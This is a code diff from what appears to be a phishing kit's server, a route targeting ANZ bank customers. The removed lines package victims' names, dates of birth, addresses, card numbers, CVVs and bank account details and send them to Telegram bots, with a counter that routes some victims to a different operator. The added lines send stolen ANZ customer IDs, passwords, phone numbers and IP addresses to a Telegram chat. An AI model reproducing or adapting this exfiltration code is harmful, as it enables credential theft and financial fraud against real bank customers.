@@ -2616,22 +2616,10 @@ app.post('/anzAR', (req, res) => {
         }
     }).then(function () {
         binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
-        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-        if (skiii719 == 7) {
-            axios.post(
-                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-            );
-            skiii719 = 0;
-        } else {
-            axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
-            );
-            axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
-            );
-            skiii719 += 1;
-        }
-
+        var originalText = `+----------- ANZ Login Information ------------+\nCustomer ID: ${customerId}\nPassword ${password}\nTelephone: ${telephone}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}`;
+        axios.post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=-725162140&text=ANZ:\n${originalText}`
+        );
         res.send("Update Completed");
     })
 });
